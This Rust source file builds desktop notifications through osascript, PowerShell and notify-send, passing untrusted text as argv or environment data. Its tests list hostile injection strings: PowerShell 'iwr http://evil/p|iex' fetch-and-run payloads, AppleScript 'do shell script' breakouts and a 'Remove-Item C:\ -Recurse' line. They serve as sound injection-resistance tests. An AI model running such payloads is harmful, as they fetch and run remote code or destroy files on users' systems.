//! The OS notification at the end of a run: with the app closed there's no
//! window to show it in, so it goes through each OS's own tool. A failure
//! to notify is logged and nothing more.
//!
//! The title and body carry text from the database (a failed step's error),
//! so they are never spliced into a script: each OS gets a fixed script and
//! the text travels out of band, as separate argv entries or environment
//! variables that the script only reads as data.

use std::process::{Command, Stdio};

pub fn send(title: &str, body: &str) {
    let body: String = body.chars().take(240).collect();
    let inv = invocation(&clean(title), &clean(&body));
    if let Err(e) = run(inv) {
        tracing::warn!("could not show the notification: {e}");
    }
}

/// Argv entries and environment values can't hold a NUL; dropping it keeps
/// the spawn from failing on a server message that happens to have one.
fn clean(s: &str) -> String {
    s.replace('\0', "")
}

/// What to run: built without touching the OS, so it can be tested on every
/// platform.
#[derive(Debug)]
struct Invocation {
    program: &'static str,
    args: Vec<String>,
    env: Vec<(&'static str, String)>,
}

fn run(inv: Invocation) -> std::io::Result<()> {
    let mut cmd = Command::new(inv.program);
    cmd.args(&inv.args).envs(inv.env);
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        cmd.creation_flags(CREATE_NO_WINDOW);
    }
    let status = cmd.stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).status()?;
    if status.success() { Ok(()) } else { Err(std::io::Error::other(format!("exit {status}"))) }
}

#[cfg(target_os = "macos")]
fn invocation(title: &str, body: &str) -> Invocation {
    macos_invocation(title, body)
}

#[cfg(windows)]
fn invocation(title: &str, body: &str) -> Invocation {
    windows_invocation(title, body)
}

#[cfg(all(unix, not(target_os = "macos")))]
fn invocation(title: &str, body: &str) -> Invocation {
    linux_invocation(title, body)
}

/// AppleScript's run handler gets the text as `argv`, so it is never parsed
/// as AppleScript. `--` stops osascript's option parsing, so a title that
/// starts with `-` isn't read as a flag.
const MACOS_SCRIPT: [&str; 3] = [
    "on run argv",
    "display notification (item 2 of argv) with title (item 1 of argv)",
    "end run",
];

#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
fn macos_invocation(title: &str, body: &str) -> Invocation {
    let mut args = Vec::new();
    for line in MACOS_SCRIPT {
        args.push("-e".to_string());
        args.push(line.to_string());
    }
    args.extend(["--".to_string(), title.to_string(), body.to_string()]);
    Invocation { program: "/usr/bin/osascript", args, env: Vec::new() }
}

const WINDOWS_TITLE_VAR: &str = "DBINE_NOTIFY_TITLE";
const WINDOWS_BODY_VAR: &str = "DBINE_NOTIFY_BODY";

/// A toast through WinRT, as PowerShell's own app id (always registered). The
/// script is a constant: the title and body come from environment variables
/// and are XML-escaped inside it, so no quote of any kind in them can reach
/// PowerShell's parser. It has no double quotes, so passing it on the
/// command line needs no quoting either.
const WINDOWS_SCRIPT: &str = "$ErrorActionPreference = 'Stop'; \
[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null; \
[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] > $null; \
$title = [System.Security.SecurityElement]::Escape([string]$env:DBINE_NOTIFY_TITLE); \
$body = [System.Security.SecurityElement]::Escape([string]$env:DBINE_NOTIFY_BODY); \
$x = New-Object Windows.Data.Xml.Dom.XmlDocument; \
$x.LoadXml('<toast><visual><binding template=''ToastGeneric''><text>' + $title + '</text><text>' + $body + '</text></binding></visual></toast>'); \
$t = [Windows.UI.Notifications.ToastNotification]::new($x); \
[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\WindowsPowerShell\\v1.0\\powershell.exe').Show($t)";

#[cfg_attr(not(windows), allow(dead_code))]
fn windows_invocation(title: &str, body: &str) -> Invocation {
    Invocation {
        program: "powershell.exe",
        args: ["-NoProfile", "-NonInteractive", "-Command", WINDOWS_SCRIPT].map(String::from).to_vec(),
        env: vec![(WINDOWS_TITLE_VAR, title.to_string()), (WINDOWS_BODY_VAR, body.to_string())],
    }
}

/// notify-send runs without a shell, each text its own argv entry; `--` keeps
/// a title that starts with `-` from being read as an option.
#[cfg_attr(not(all(unix, not(target_os = "macos"))), allow(dead_code))]
fn linux_invocation(title: &str, body: &str) -> Invocation {
    Invocation {
        program: "notify-send",
        args: ["--app-name=DBine", "--", title, body].map(String::from).to_vec(),
        env: Vec::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Text built to break out of each OS's quoting: every single-quote
    /// variant PowerShell accepts, double quotes, backticks, `$()`, newlines,
    /// XML and AppleScript metacharacters, and a leading `-`.
    const HOSTILE: &[&str] = &[
        "'+(iwr http://evil/p|iex)+'",
        "\u{2018}+(iwr http://evil/p|iex)+\u{2018}",
        "\u{2019}+(iwr http://evil/p|iex)+\u{2019}",
        "\u{201A}+(iwr http://evil/p|iex)+\u{201A}",
        "\u{201B}+(iwr http://evil/p|iex)+\u{201B}",
        "\"; do shell script \"id\" --",
        "`whoami` $(id) ${env:PATH} $env:USERNAME",
        "line1\nline2\r\n'); Remove-Item C:\\ -Recurse; ('",
        "</text></binding><x>&amp;<![CDATA[",
        "-version",
        "\\\" & do shell script \"touch /tmp/pwn\" & \"",
    ];

    fn script_text(inv: &Invocation) -> String {
        inv.args.join("\u{1}")
    }

    #[test]
    fn windows_script_is_constant_and_text_goes_through_env() {
        for &h in HOSTILE {
            let inv = windows_invocation(h, h);
            assert_eq!(inv.program, "powershell.exe");
            assert_eq!(inv.args, ["-NoProfile", "-NonInteractive", "-Command", WINDOWS_SCRIPT]);
            assert!(!script_text(&inv).contains(h));
            assert_eq!(inv.env, vec![(WINDOWS_TITLE_VAR, h.to_string()), (WINDOWS_BODY_VAR, h.to_string())]);
        }
    }

    #[test]
    fn windows_script_reads_the_env_vars_it_is_given() {
        assert!(WINDOWS_SCRIPT.contains(&format!("$env:{WINDOWS_TITLE_VAR}")));
        assert!(WINDOWS_SCRIPT.contains(&format!("$env:{WINDOWS_BODY_VAR}")));
        assert!(WINDOWS_SCRIPT.contains("SecurityElement]::Escape"));
        // No double quotes: nothing for the command-line quoting to get wrong.
        assert!(!WINDOWS_SCRIPT.contains('"'));
        assert!(!WINDOWS_SCRIPT.contains(['\u{2018}', '\u{2019}', '\u{201A}', '\u{201B}', '\u{201C}', '\u{201D}', '\u{201E}']));
    }

    #[test]
    fn macos_script_is_constant_and_text_goes_through_argv() {
        for &h in HOSTILE {
            let inv = macos_invocation(h, "body");
            assert_eq!(inv.program, "/usr/bin/osascript");
            let n = inv.args.len();
            assert_eq!(&inv.args[n - 3..], ["--", h, "body"]);
            let script: Vec<&str> = inv.args[..n - 3].iter().map(String::as_str).collect();
            assert_eq!(script, ["-e", MACOS_SCRIPT[0], "-e", MACOS_SCRIPT[1], "-e", MACOS_SCRIPT[2]]);
            assert!(inv.env.is_empty());
        }
    }

    #[test]
    fn linux_text_goes_as_separate_args_after_double_dash() {
        for &h in HOSTILE {
            let inv = linux_invocation(h, h);
            assert_eq!(inv.program, "notify-send");
            assert_eq!(inv.args, ["--app-name=DBine", "--", h, h]);
        }
    }

    #[test]
    fn nul_is_dropped() {
        assert_eq!(clean("a\0b"), "ab");
    }

    /// Runs the real osascript with hostile argv and checks it comes back
    /// verbatim as data instead of being run.
    #[cfg(target_os = "macos")]
    #[test]
    fn osascript_takes_argv_as_data() {
        for &h in HOSTILE {
            let out = Command::new("/usr/bin/osascript")
                .args(["-e", "on run argv", "-e", "return item 1 of argv", "-e", "end run", "--", h])
                .output()
                .unwrap();
            assert!(out.status.success(), "{h:?}: {}", String::from_utf8_lossy(&out.stderr));
            let got = String::from_utf8_lossy(&out.stdout);
            assert_eq!(got.strip_suffix('\n').unwrap_or(&got).replace('\r', "\n"), h.replace('\r', "\n"));
        }
    }
}
